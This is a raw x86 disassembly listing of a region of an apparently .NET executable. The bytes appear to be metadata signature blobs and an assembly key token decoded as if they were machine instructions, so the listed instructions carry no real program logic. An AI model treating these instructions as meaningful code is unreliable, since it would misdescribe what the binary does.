  409aab:	54                   	push   %esp
  409aac:	8a a7 3f 24 00 04    	mov    0x400243f(%edi),%ah
  409ab2:	20 01                	and    %al,(%ecx)
  409ab4:	01 08                	add    %ecx,(%eax)
  409ab6:	03 20                	add    (%eax),%esp
  409ab8:	00 01                	add    %al,(%ecx)
  409aba:	05 20 01 01 11       	add    $0x11010120,%eax
  409abf:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  409ac2:	01 01                	add    %eax,(%ecx)
  409ac4:	0e                   	push   %cs
  409ac5:	04 20                	add    $0x20,%al
  409ac7:	01 01                	add    %eax,(%ecx)
  409ac9:	02 03                	add    (%ebx),%al
  409acb:	20 00                	and    %al,(%eax)
  409acd:	1c 03                	sbb    $0x3,%al
  409acf:	20 00                	and    %al,(%eax)
  409ad1:	02 05 20 00 12 80    	add    0x80120020,%al
  409ad7:	81 03 07 01 08 04    	addl   $0x4080107,(%ebx)
  409add:	00 01                	add    %al,(%ecx)
  409adf:	01 08                	add    %ecx,(%eax)
  409ae1:	04 00                	add    $0x0,%al
  409ae3:	01 08                	add    %ecx,(%eax)
  409ae5:	0e                   	push   %cs
  409ae6:	04 00                	add    $0x0,%al
  409ae8:	01 02                	add    %eax,(%edx)
  409aea:	0e                   	push   %cs
  409aeb:	05 20 02 08 08       	add    $0x8080220,%eax
  409af0:	08 03                	or     %al,(%ebx)
  409af2:	07                   	pop    %es
  409af3:	01 02                	add    %eax,(%edx)
  409af5:	05 00 00 12 81       	add    $0x81120000,%eax
  409afa:	11 05 00 01 1d 05    	adc    %eax,0x51d0100
  409b00:	0e                   	push   %cs
  409b01:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  409b06:	05 05 20 01 01       	add    $0x1012005,%eax
  409b0b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  409b10:	12 81 15 05 20 00    	adc    0x200515(%ecx),%al
  409b16:	12 81 19 05 20 01    	adc    0x1200519(%ecx),%al
  409b1c:	1d 05 0e 04 00       	sbb    $0x40e05,%eax
  409b21:	01 0e                	add    %ecx,(%esi)
  409b23:	0e                   	push   %cs
  409b24:	08 20                	or     %ah,(%eax)
  409b26:	03 02                	add    (%edx),%eax
  409b28:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  409b2d:	10 07                	adc    %al,(%edi)
  409b2f:	08 0e                	or     %cl,(%esi)
  409b31:	08 1d 12 59 08 12    	or     %bl,0x12085912
  409b37:	59                   	pop    %ecx
  409b38:	12 5d 12             	adc    0x12(%ebp),%bl
  409b3b:	61                   	popa
  409b3c:	1d 0e 0c 20 03       	sbb    $0x3200c0e,%eax
  409b41:	01 11                	add    %edx,(%ecx)
  409b43:	81 25 11 81 29 11 81 	andl   $0x52d81,0x11298111
  409b4a:	2d 05 00 
  409b4d:	02 02                	add    (%edx),%al
  409b4f:	0e                   	push   %cs
  409b50:	0e                   	push   %cs
  409b51:	06                   	push   %es
  409b52:	20 01                	and    %al,(%ecx)
  409b54:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  409b59:	20 01                	and    %al,(%ecx)
  409b5b:	08 08                	or     %cl,(%eax)
  409b5d:	06                   	push   %es
  409b5e:	00 01                	add    %al,(%ecx)
  409b60:	1d 12 59 0e 06       	sbb    $0x60e5912,%eax
  409b65:	20 02                	and    %al,(%edx)
  409b67:	01 12                	add    %edx,(%edx)
  409b69:	59                   	pop    %ecx
  409b6a:	08 05 20 02 01 0e    	or     %al,0xe010220
  409b70:	08 05 20 02 01 0e    	or     %al,0xe010220
  409b76:	0e                   	push   %cs
  409b77:	06                   	push   %es
  409b78:	20 01                	and    %al,(%ecx)
  409b7a:	01 12                	add    %edx,(%edx)
  409b7c:	81 3d 04 20 01 0e 0e 	cmpl   $0x220090e,0xe012004
  409b83:	09 20 02 
  409b86:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  409b8b:	81 41 06 20 02 01 12 	addl   $0x12010220,0x6(%ecx)
  409b92:	4d                   	dec    %ebp
  409b93:	02 05 20 02 01 1c    	add    0x1c010220,%al
  409b99:	18 0a                	sbb    %cl,(%edx)
  409b9b:	20 03                	and    %al,(%ebx)
  409b9d:	01 12                	add    %edx,(%edx)
  409b9f:	80 95 02 12 81 4d 05 	adcb   $0x5,0x4d811202(%ebp)
  409ba6:	20 00                	and    %al,(%eax)
  409ba8:	12 81 51 03 20 00    	adc    0x200351(%ecx),%al
  409bae:	0e                   	push   %cs
  409baf:	0b 20                	or     (%eax),%esp
  409bb1:	04 01                	add    $0x1,%al
  409bb3:	0e                   	push   %cs
  409bb4:	12 81 55 11 81 59    	adc    0x59811155(%ecx),%al
  409bba:	02 09                	add    (%ecx),%cl
  409bbc:	20 04 01             	and    %al,(%ecx,%eax,1)
  409bbf:	12 81 61 1c 08 08    	adc    0x8081c61(%ecx),%al
  409bc5:	0c 20                	or     $0x20,%al
  409bc7:	05 12 71 1d 05       	add    $0x51d7112,%eax
  409bcc:	08 08                	or     %cl,(%eax)
  409bce:	12 81 65 1c 06 00    	adc    0x61c65(%ecx),%al
  409bd4:	01 11                	add    %edx,(%ecx)
  409bd6:	81 6d 0e 05 20 01 02 	subl   $0x2012005,0xe(%ebp)
  409bdd:	12 65 04             	adc    0x4(%ebp),%ah
  409be0:	07                   	pop    %es
  409be1:	02 08                	add    (%eax),%cl
  409be3:	08 05 20 01 08 12    	or     %al,0x12080120
  409be9:	71 06                	jno    0x409bf1
  409beb:	00 02                	add    %al,(%edx)
  409bed:	08 1d 05 08 07 20    	or     %bl,0x20070805
  409bf3:	03 08                	add    (%eax),%ecx
  409bf5:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  409bfa:	20 01                	and    %al,(%ecx)
  409bfc:	01 12                	add    %edx,(%edx)
  409bfe:	81 75 04 20 01 01 1c 	xorl   $0x1c010120,0x4(%ebp)
  409c05:	0b 07                	or     (%edi),%eax
  409c07:	06                   	push   %es
  409c08:	1c 02                	sbb    $0x2,%al
  409c0a:	1d 05 12 75 08       	sbb    $0x8751205,%eax
  409c0f:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  409c14:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  409c17:	02 05 00 01 1d 05    	add    0x51d0100,%al
  409c1d:	08 07                	or     %al,(%edi)
  409c1f:	20 02                	and    %al,(%edx)
  409c21:	02 08                	add    (%eax),%cl
  409c23:	11 81 7d 07 20 03    	adc    %eax,0x320077d(%ecx)
  409c29:	01 1d 05 08 08 04    	add    %ebx,0x4080805
  409c2f:	20 01                	and    %al,(%ecx)
  409c31:	01 0a                	add    %ecx,(%edx)
  409c33:	04 00                	add    $0x0,%al
  409c35:	01 01                	add    %eax,(%ecx)
  409c37:	1c 05                	sbb    $0x5,%al
  409c39:	00 02                	add    %al,(%edx)
  409c3b:	0e                   	push   %cs
  409c3c:	0e                   	push   %cs
  409c3d:	0e                   	push   %cs
  409c3e:	03 00                	add    (%eax),%eax
  409c40:	00 01                	add    %al,(%ecx)
  409c42:	08 07                	or     %al,(%edi)
  409c44:	04 12                	add    $0x12,%al
  409c46:	7d 1d                	jge    0x409c65
  409c48:	05 08 05 05 00       	add    $0x50508,%eax
  409c4d:	02 0e                	add    (%esi),%cl
  409c4f:	0e                   	push   %cs
  409c50:	1c 05                	sbb    $0x5,%al
  409c52:	20 01                	and    %al,(%ecx)
  409c54:	12 7d 0e             	adc    0xe(%ebp),%bh
  409c57:	06                   	push   %es
  409c58:	07                   	pop    %es
  409c59:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  409c5f:	00 01                	add    %al,(%ecx)
  409c61:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  409c66:	01 1d 05 0d 07 15    	add    %ebx,0x15070d05
  409c6c:	12 80 85 01 12 20    	adc    0x20120185(%eax),%al
  409c72:	05 20 01 13 00       	add    $0x130120,%eax
  409c77:	08 03                	or     %al,(%ebx)
  409c79:	20 00                	and    %al,(%eax)
  409c7b:	08 04 07             	or     %al,(%edi,%eax,1)
  409c7e:	01 12                	add    %edx,(%edx)
  409c80:	20 05 20 01 01 13    	and    %al,0x13010120
  409c86:	00 0e                	add    %cl,(%esi)
  409c88:	07                   	pop    %es
  409c89:	05 08 08 0e 15       	add    $0x150e0808,%eax
  409c8e:	11 80 91 01 12 20    	adc    %eax,0x20120191(%eax)
  409c94:	12 20                	adc    (%eax),%ah
  409c96:	09 20                	or     %esp,(%eax)
  409c98:	00 15 11 80 91 01    	add    %dl,0x1918011
  409c9e:	13 00                	adc    (%eax),%eax
  409ca0:	07                   	pop    %es
  409ca1:	15 11 80 91 01       	adc    $0x1918011,%eax
  409ca6:	12 20                	adc    (%eax),%ah
  409ca8:	04 20                	add    $0x20,%al
  409caa:	00 13                	add    %dl,(%ebx)
  409cac:	00 04 20             	add    %al,(%eax,%eiz,1)
  409caf:	01 02                	add    %eax,(%edx)
  409cb1:	0e                   	push   %cs
  409cb2:	07                   	pop    %es
  409cb3:	07                   	pop    %es
  409cb4:	04 05                	add    $0x5,%al
  409cb6:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  409cbb:	20 01                	and    %al,(%ecx)
  409cbd:	01 05 05 00 01 1d    	add    %eax,0x1d010005
  409cc3:	05 06 04 07 01       	add    $0x1070406,%eax
  409cc8:	11 24 04             	adc    %esp,(%esp,%eax,1)
  409ccb:	00 01                	add    %al,(%ecx)
  409ccd:	0b 0a                	or     (%edx),%ecx
  409ccf:	04 00                	add    $0x0,%al
  409cd1:	01 0b                	add    %ecx,(%ebx)
  409cd3:	0e                   	push   %cs
  409cd4:	04 00                	add    $0x0,%al
  409cd6:	01 0b                	add    %ecx,(%ebx)
  409cd8:	0d 04 00 01 0b       	or     $0xb010004,%eax
  409cdd:	0c 06                	or     $0x6,%al
  409cdf:	00 01                	add    %al,(%ecx)
  409ce1:	0b 11                	or     (%ecx),%edx
  409ce3:	80 99 04 00 01 0a 0a 	sbbb   $0xa,0xa010004(%ecx)
  409cea:	04 00                	add    $0x0,%al
  409cec:	01 0a                	add    %ecx,(%edx)
  409cee:	0e                   	push   %cs
  409cef:	04 00                	add    $0x0,%al
  409cf1:	01 0a                	add    %ecx,(%edx)
  409cf3:	0d 04 00 01 0a       	or     $0xa010004,%eax
  409cf8:	0c 06                	or     $0x6,%al
  409cfa:	00 01                	add    %al,(%ecx)
  409cfc:	0a 11                	or     (%ecx),%dl
  409cfe:	80 99 04 00 01 0d 0a 	sbbb   $0xa,0xd010004(%ecx)
  409d05:	04 00                	add    $0x0,%al
  409d07:	01 0d 0e 07 07 02    	add    %ecx,0x207070e
  409d0d:	11 24 11             	adc    %esp,(%ecx,%edx,1)
  409d10:	80 99 05 00 01 1d 05 	sbbb   $0x5,0x1d010005(%ecx)
  409d17:	0c 03                	or     $0x3,%al
  409d19:	20 00                	and    %al,(%eax)
  409d1b:	0a 02                	or     (%edx),%al
  409d1d:	1d 05 07 07 02       	sbb    $0x2070705,%eax
  409d22:	1d 05 12 80 9d       	sbb    $0x9d801205,%eax
  409d27:	0d 20 04 01 0e       	or     $0xe010420,%eax
  409d2c:	11 81 99 11 81 9d    	adc    %eax,-0x627eee67(%ecx)
  409d32:	11 81 a1 07 20 02    	adc    %eax,0x22007a1(%ecx)
  409d38:	01 0e                	add    %ecx,(%esi)
  409d3a:	11 81 99 0b 07 06    	adc    %eax,0x6070b99(%ecx)
  409d40:	12 20                	adc    (%eax),%ah
  409d42:	12 20                	adc    (%eax),%ah
  409d44:	1d 0e 0e 08 08       	sbb    $0x8080e0e,%eax
  409d49:	09 00                	or     %eax,(%eax)
  409d4b:	02 01                	add    (%ecx),%al
  409d4d:	12 81 a9 11 81 ad    	adc    -0x527eee57(%ecx),%al
  409d53:	04 07                	add    $0x7,%al
  409d55:	01 12                	add    %edx,(%edx)
  409d57:	75 05                	jne    0x409d5e
  409d59:	07                   	pop    %es
  409d5a:	01 12                	add    %edx,(%edx)
  409d5c:	80 9d 06 00 02 07 1d 	sbbb   $0x1d,0x7020006(%ebp)
  409d63:	05 08 06 00 02       	add    $0x2000608,%eax
  409d68:	0c 1d                	or     $0x1d,%al
  409d6a:	05 08 06 00 02       	add    $0x2000608,%eax
  409d6f:	0d 1d 05 08 06       	or     $0x608051d,%eax
  409d74:	00 02                	add    %al,(%edx)
  409d76:	09 1d 05 08 06 00    	or     %ebx,0x60805
  409d7c:	02 0b                	add    (%ebx),%cl
  409d7e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  409d83:	02 06                	add    (%esi),%al
  409d85:	1d 05 08 06 00       	sbb    $0x60805,%eax
  409d8a:	02 0a                	add    (%edx),%cl
  409d8c:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  409d91:	03 12                	add    (%edx),%edx
  409d93:	75 1d                	jne    0x409db2
  409d95:	05 1d 05 05 07       	add    $0x705051d,%eax
  409d9a:	02 12                	add    (%edx),%dl
  409d9c:	20 02                	and    %al,(%edx)
  409d9e:	04 07                	add    $0x7,%al
  409da0:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  409da6:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  409dab:	04 1d                	add    $0x1d,%al
  409dad:	05 1d 05 08 05       	add    $0x508051d,%eax
  409db2:	06                   	push   %es
  409db3:	07                   	pop    %es
  409db4:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  409dba:	00 01                	add    %al,(%ecx)
  409dbc:	1d 05 0b 1f 07       	sbb    $0x71f0b05,%eax
  409dc1:	0c 12                	or     $0x12,%al
  409dc3:	80 a5 1d 05 1d 05 0e 	andb   $0xe,0x51d051d(%ebp)
  409dca:	08 1d 12 80 a9 08    	or     %bl,0x8a98012
  409dd0:	12 80 a9 12 80 a9    	adc    -0x567fed57(%eax),%al
  409dd6:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  409ddc:	12 80 b5 05 00 00    	adc    0x5b5(%eax),%al
  409de2:	12 80 a9 05 20 00    	adc    0x2005a9(%eax),%al
  409de8:	12 81 b9 06 00 00    	adc    0x6b9(%ecx),%al
  409dee:	1d 12 80 a9 05       	sbb    $0x5a98012,%eax
  409df3:	00 01                	add    %al,(%ecx)
  409df5:	0e                   	push   %cs
  409df6:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  409dfb:	01 11                	add    %edx,(%ecx)
  409dfd:	81 c1 06 20 01 01    	add    $0x1012006,%ecx
  409e03:	12 80 ad 04 06 12    	adc    0x120604ad(%eax),%al
  409e09:	80 b1 09 20 02 12 80 	xorb   $0x80,0x12022009(%ecx)
  409e10:	b1 0e                	mov    $0xe,%cl
  409e12:	11 81 cd 06 00 03    	adc    %eax,0x30006cd(%ecx)
  409e18:	0e                   	push   %cs
  409e19:	0e                   	push   %cs
  409e1a:	0e                   	push   %cs
  409e1b:	0e                   	push   %cs
  409e1c:	05 20 02 01 0e       	add    $0xe010220,%eax
  409e21:	1c 04                	sbb    $0x4,%al
  409e23:	00 01                	add    %al,(%ecx)
  409e25:	01 0e                	add    %ecx,(%esi)
  409e27:	03 00                	add    (%eax),%eax
  409e29:	00 0e                	add    %cl,(%esi)
  409e2b:	08 00                	or     %al,(%eax)
  409e2d:	01 12                	add    %edx,(%edx)
  409e2f:	80 a9 12 80 ad 04 07 	subb   $0x7,0x4ad8012(%ecx)
  409e36:	02 0a                	add    (%edx),%cl
  409e38:	02 10                	add    (%eax),%dl
  409e3a:	07                   	pop    %es
  409e3b:	06                   	push   %es
  409e3c:	12 80 b9 12 80 bd    	adc    -0x427fed47(%eax),%al
  409e42:	12 80 c1 12 80 c5    	adc    -0x3a7fed3f(%eax),%al
  409e48:	0e                   	push   %cs
  409e49:	02 05 20 00 12 80    	add    0x80120020,%al
  409e4f:	bd 05 20 00 12       	mov    $0x12002005,%ebp
  409e54:	80 c1 05             	add    $0x5,%cl
  409e57:	20 00                	and    %al,(%eax)
  409e59:	12 80 c5 04 20 01    	adc    0x12004c5(%eax),%al
  409e5f:	1c 0e                	sbb    $0xe,%al
  409e61:	04 07                	add    $0x7,%al
  409e63:	02 02                	add    (%edx),%al
  409e65:	02 03                	add    (%ebx),%al
  409e67:	20 00                	and    %al,(%eax)
  409e69:	18 04 07             	sbb    %al,(%edi,%eax,1)
  409e6c:	02 18                	add    (%eax),%bl
  409e6e:	02 0b                	add    (%ebx),%cl
  409e70:	07                   	pop    %es
  409e71:	04 1d                	add    $0x1d,%al
  409e73:	12 80 a9 08 12 80    	adc    -0x7fedf757(%eax),%al
  409e79:	a9 0e 0a 07 04       	test   $0x4070a0e,%eax
  409e7e:	12 80 b9 08 12 80    	adc    -0x7fedf747(%eax),%al
  409e84:	bd 0e 0d 10 01       	mov    $0x1100d0e,%ebp
  409e89:	01 15 12 81 e9 01    	add    %edx,0x1e98112
  409e8f:	1e                   	push   %ds
  409e90:	00 12                	add    %dl,(%edx)
  409e92:	80 8d 05 0a 01 12 80 	orb    $0x80,0x12010a05(%ebp)
  409e99:	c5 0c 10             	lds    (%eax,%edx,1),%ecx
  409e9c:	01 01                	add    %eax,(%ecx)
  409e9e:	1e                   	push   %ds
  409e9f:	00 15 12 81 e9 01    	add    %dl,0x1e98112
  409ea5:	1e                   	push   %ds
  409ea6:	00 03                	add    %al,(%ebx)
  409ea8:	07                   	pop    %es
  409ea9:	01 0e                	add    %ecx,(%esi)
  409eab:	03 00                	add    (%eax),%eax
  409ead:	00 08                	add    %cl,(%eax)
  409eaf:	05 00 00 12 81       	add    $0x81120000,%eax
  409eb4:	ed                   	in     (%dx),%eax
  409eb5:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  409eba:	1c 0a                	sbb    $0xa,%al
  409ebc:	07                   	pop    %es
  409ebd:	05 1d 05 12 7d       	add    $0x7d12051d,%eax
  409ec2:	1d 05 08 05 06       	sbb    $0x6050805,%eax
  409ec7:	20 01                	and    %al,(%ecx)
  409ec9:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
  409ece:	20 02                	and    %al,(%edx)
  409ed0:	0e                   	push   %cs
  409ed1:	08 08                	or     %cl,(%eax)
  409ed3:	06                   	push   %es
  409ed4:	07                   	pop    %es
  409ed5:	02 02                	add    (%edx),%al
  409ed7:	11 80 99 05 20 02    	adc    %eax,0x2200599(%eax)
  409edd:	0e                   	push   %cs
  409ede:	0e                   	push   %cs
  409edf:	0e                   	push   %cs
  409ee0:	03 00                	add    (%eax),%eax
  409ee2:	00 02                	add    %al,(%edx)
  409ee4:	05 20 00 11 80       	add    $0x80110020,%eax
  409ee9:	99                   	cltd
  409eea:	05 00 00 12 81       	add    $0x81120000,%eax
  409eef:	fd                   	std
  409ef0:	06                   	push   %es
  409ef1:	20 01                	and    %al,(%ecx)
  409ef3:	01 12                	add    %edx,(%edx)
  409ef5:	81 fd 06 20 01 02    	cmp    $0x2012006,%ebp
  409efb:	11 82 05 12 07 05    	adc    %eax,0x5071205(%edx)
  409f01:	12 80 b9 15 12 80    	adc    -0x7fedea47(%eax),%al
  409f07:	85 01                	test   %eax,(%ecx)
  409f09:	0e                   	push   %cs
  409f0a:	12 80 c1 12 80 c5    	adc    -0x3a7fed3f(%eax),%al
  409f10:	0e                   	push   %cs
  409f11:	06                   	push   %es
  409f12:	15 12 80 85 01       	adc    $0x1858012,%eax
  409f17:	0e                   	push   %cs
  409f18:	05 20 00 1d 13       	add    $0x131d0020,%eax
  409f1d:	00 06                	add    %al,(%esi)
  409f1f:	00 02                	add    %al,(%edx)
  409f21:	0e                   	push   %cs
  409f22:	0e                   	push   %cs
  409f23:	1d 0e 0a 07 03       	sbb    $0x3070a0e,%eax
  409f28:	1d 12 80 c9 08       	sbb    $0x8c98012,%eax
  409f2d:	12 80 c9 06 00 00    	adc    0x6c9(%eax),%al
  409f33:	1d 12 80 c9 05       	sbb    $0x5c98012,%eax
  409f38:	20 00                	and    %al,(%eax)
  409f3a:	11 82 09 09 00 02    	adc    %eax,0x2000909(%edx)
  409f40:	02 11                	add    (%ecx),%dl
  409f42:	82 09 11             	orb    $0x11,(%ecx)
  409f45:	82 09 07             	orb    $0x7,(%ecx)
  409f48:	20 03                	and    %al,(%ebx)
  409f4a:	01 02                	add    %eax,(%edx)
  409f4c:	0e                   	push   %cs
  409f4d:	10 02                	adc    %al,(%edx)
  409f4f:	06                   	push   %es
  409f50:	00 01                	add    %al,(%ecx)
  409f52:	01 12                	add    %edx,(%edx)
  409f54:	82 11 06             	adcb   $0x6,(%ecx)
  409f57:	07                   	pop    %es
  409f58:	02 12                	add    (%edx),%dl
  409f5a:	80 b1 02 08 20 03 01 	xorb   $0x1,0x3200802(%ecx)
  409f61:	0e                   	push   %cs
  409f62:	1c 11                	sbb    $0x11,%al
  409f64:	82 19 06             	sbbb   $0x6,(%ecx)
  409f67:	07                   	pop    %es
  409f68:	02 12                	add    (%edx),%dl
  409f6a:	80 b1 0e 06 20 01 12 	xorb   $0x12,0x120060e(%ecx)
  409f71:	80 b1 0e 07 20 02 12 	xorb   $0x12,0x220070e(%ecx)
  409f78:	80 b1 0e 02 11 07 06 	xorb   $0x6,0x711020e(%ecx)
  409f7f:	12 20                	adc    (%eax),%ah
  409f81:	0e                   	push   %cs
  409f82:	08 12                	or     %dl,(%edx)
  409f84:	45                   	inc    %ebp
  409f85:	15 11 80 91 01       	adc    $0x1918011,%eax
  409f8a:	12 20                	adc    (%eax),%ah
  409f8c:	12 20                	adc    (%eax),%ah
  409f8e:	11 10                	adc    %edx,(%eax)
  409f90:	01 01                	add    %eax,(%ecx)
  409f92:	15 12 80 85 01       	adc    $0x1858012,%eax
  409f97:	1e                   	push   %ds
  409f98:	00 15 12 81 e9 01    	add    %dl,0x1e98112
  409f9e:	1e                   	push   %ds
  409f9f:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409fa2:	01 12                	add    %edx,(%edx)
  409fa4:	20 05 20 01 02 13    	and    %al,0x13020120
  409faa:	00 03                	add    %al,(%ebx)
  409fac:	07                   	pop    %es
  409fad:	01 1c 05 00 00 12 82 	add    %ebx,-0x7dee0000(,%eax,1)
  409fb4:	1d 07 20 01 12       	sbb    $0x12012007,%eax
  409fb9:	82 21 1d             	andb   $0x1d,(%ecx)
  409fbc:	05 06 20 01 12       	add    $0x12012006,%eax
  409fc1:	82 25 0e 06 00 01 1c 	andb   $0x1c,0x100060e
  409fc8:	12 82 25 08 00 01    	adc    0x1000825(%edx),%al
  409fce:	12 82 25 11 82 2d    	adc    0x2d821125(%edx),%al
  409fd4:	09 00                	or     %eax,(%eax)
  409fd6:	02 12                	add    (%edx),%dl
  409fd8:	82 31 11             	xorb   $0x11,(%ecx)
  409fdb:	82 35 0e 1c 00 05 12 	xorb   $0x12,0x5001c0e
  409fe2:	82 3d 11 82 41 0e 15 	cmpb   $0x15,0xe418211
  409fe9:	12 81 e9 01 12 82    	adc    -0x7dedfe17(%ecx),%al
  409fef:	25 12 82 25 15       	and    $0x15258212,%eax
  409ff4:	12 81 e9 01 12 82    	adc    -0x7dedfe17(%ecx),%al
  409ffa:	31 1b                	xor    %ebx,(%ebx)
  409ffc:	15 12 80 d9 01       	adc    $0x1d98012,%eax
  40a001:	15 12 80 dd 0a       	adc    $0xadd8012,%eax
  40a006:	12 80 e1 1c 12 4d    	adc    0x4d121ce1(%eax),%al
  40a00c:	12 41 0e             	adc    0xe(%ecx),%al
  40a00f:	1d 05 12 80 d1       	sbb    $0xd1801205,%eax
  40a014:	0e                   	push   %cs
  40a015:	0e                   	push   %cs
  40a016:	0e                   	push   %cs
  40a017:	0c 00                	or     $0x0,%al
  40a019:	01 15 12 80 d9 01    	add    %edx,0x1d98012
  40a01f:	13 00                	adc    (%eax),%eax
  40a021:	12 82 3d 03 06 13    	adc    0x1306033d(%edx),%al
  40a027:	00 16                	add    %dl,(%esi)
  40a029:	15 12 80 dd 0a       	adc    $0xadd8012,%eax
  40a02e:	12 80 e1 1c 12 4d    	adc    0x4d121ce1(%eax),%al
  40a034:	12 41 0e             	adc    0xe(%ecx),%al
  40a037:	1d 05 12 80 d1       	sbb    $0xd1801205,%eax
  40a03c:	0e                   	push   %cs
  40a03d:	0e                   	push   %cs
  40a03e:	0e                   	push   %cs
  40a03f:	17                   	pop    %ss
  40a040:	20 0a                	and    %cl,(%edx)
  40a042:	01 13                	add    %edx,(%ebx)
  40a044:	00 13                	add    %dl,(%ebx)
  40a046:	01 13                	add    %edx,(%ebx)
  40a048:	02 13                	add    (%ebx),%dl
  40a04a:	03 13                	add    (%ebx),%edx
  40a04c:	04 13                	add    $0x13,%al
  40a04e:	05 13 06 13 07       	add    $0x7130613,%eax
  40a053:	13 08                	adc    (%eax),%ecx
  40a055:	13 09                	adc    (%ecx),%ecx
  40a057:	05 07 01 12 80       	add    $0x80120107,%eax
  40a05c:	e5 07                	in     $0x7,%eax
  40a05e:	20 03                	and    %al,(%ebx)
  40a060:	01 0e                	add    %ecx,(%esi)
  40a062:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40a067:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40a06d:	01 0e                	add    %ecx,(%esi)
  40a06f:	1d 05 11 07 06       	sbb    $0x6071105,%eax
  40a074:	12 75 12             	adc    0x12(%ebp),%dh
  40a077:	80 e9 12             	sub    $0x12,%cl
  40a07a:	80 ed 12             	sub    $0x12,%ch
  40a07d:	80 f1 1d             	xor    $0x1d,%cl
  40a080:	05 1d 05 06 20       	add    $0x2006051d,%eax
  40a085:	01 01                	add    %eax,(%ecx)
  40a087:	11 82 55 06 20 01    	adc    %eax,0x1200655(%edx)
  40a08d:	01 11                	add    %edx,(%ecx)
  40a08f:	82 59 05 20          	sbbb   $0x20,0x5(%ecx)
  40a093:	00 12                	add    %dl,(%edx)
  40a095:	82 5d 0c 20          	sbbb   $0x20,0xc(%ebp)
  40a099:	03 01                	add    (%ecx),%eax
  40a09b:	12 80 95 12 82 5d    	adc    0x5d821295(%eax),%al
  40a0a1:	11 82 61 04 20 00    	adc    %eax,0x200461(%edx)
  40a0a7:	1d 05 08 20 03       	sbb    $0x3200805,%eax
  40a0ac:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  40a0b1:	08 19                	or     %bl,(%ecx)
  40a0b3:	07                   	pop    %es
  40a0b4:	0a 12                	or     (%edx),%dl
  40a0b6:	75 12                	jne    0x40a0ca
  40a0b8:	80 e9 1d             	sub    $0x1d,%cl
  40a0bb:	05 12 80 f1 1d       	add    $0x1df18012,%eax
  40a0c0:	05 1d 05 12 80       	add    $0x8012051d,%eax
  40a0c5:	ed                   	in     (%dx),%eax
  40a0c6:	1d 05 1d 05 1d       	sbb    $0x1d051d05,%eax
  40a0cb:	05 0c 00 05 01       	add    $0x105000c,%eax
  40a0d0:	12 81 a9 08 12 81    	adc    -0x7eedf757(%ecx),%al
  40a0d6:	a9 08 08 04 07       	test   $0x7040808,%eax
  40a0db:	02 02                	add    (%edx),%al
  40a0dd:	08 0d 07 06 1d 05    	or     %cl,0x51d0607
  40a0e3:	12 7d 12             	adc    0x12(%ebp),%bh
  40a0e6:	80 f5 1d             	xor    $0x1d,%ch
  40a0e9:	05 08 05 07 07       	add    $0x7070508,%eax
  40a0ee:	02 12                	add    (%edx),%dl
  40a0f0:	80 f5 1d             	xor    $0x1d,%ch
  40a0f3:	05 0e 07 06 12       	add    $0x1206070e,%eax
  40a0f8:	75 1d                	jne    0x40a117
  40a0fa:	05 08 12 80 f9       	add    $0xf9801208,%eax
  40a0ff:	1d 05 1d 05 09       	sbb    $0x9051d05,%eax
  40a104:	20 02                	and    %al,(%edx)
  40a106:	01 12                	add    %edx,(%edx)
  40a108:	80 95 11 82 6d 0b 07 	adcb   $0x7,0xb6d8211(%ebp)
  40a10f:	04 12                	add    $0x12,%al
  40a111:	75 1d                	jne    0x40a130
  40a113:	05 12 80 f9 1d       	add    $0x1df98012,%eax
  40a118:	05 08 b7 7a 5c       	add    $0x5c7ab708,%eax
  40a11d:	56                   	push   %esi
  40a11e:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40a121:	89 08                	mov    %ecx,(%eax)
  40a123:	b0 3f                	mov    $0x3f,%al
  40a125:	5f                   	pop    %edi
  40a126:	7f 11                	jg     0x40a139
  40a128:	d5 0a                	aad    $0xa
  40a12a:	3a 04 00             	cmp    (%eax,%eax,1),%al
  40a12d:	00 00                	add    %al,(%eax)
  40a12f:	00 04 01             	add    %al,(%ecx,%eax,1)
  40a132:	00 00                	add    %al,(%eax)
  40a134:	00 04 02             	add    %al,(%edx,%eax,1)
  40a137:	00 00                	add    %al,(%eax)
  40a139:	00 04 03             	add    %al,(%ebx,%eax,1)
  40a13c:	00 00                	add    %al,(%eax)
  40a13e:	00 04 04             	add    %al,(%esp,%eax,1)
  40a141:	00 00                	add    %al,(%eax)
  40a143:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40a14a:	06                   	push   %es
  40a14b:	00 00                	add    %al,(%eax)
  40a14d:	00 04 07             	add    %al,(%edi,%eax,1)
  40a150:	00 00                	add    %al,(%eax)
  40a152:	00 04 08             	add    %al,(%eax,%ecx,1)
  40a155:	00 00                	add    %al,(%eax)
  40a157:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40a15a:	00 00                	add    %al,(%eax)
  40a15c:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40a15f:	00 00                	add    %al,(%eax)
  40a161:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40a164:	00 00                	add    %al,(%eax)
  40a166:	00 04 20             	add    %al,(%eax,%eiz,1)
  40a169:	00 00                	add    %al,(%eax)
  40a16b:	00 04 40             	add    %al,(%eax,%eax,2)
  40a16e:	00 00                	add    %al,(%eax)
  40a170:	00 04 10             	add    %al,(%eax,%edx,1)
  40a173:	00 00                	add    %al,(%eax)
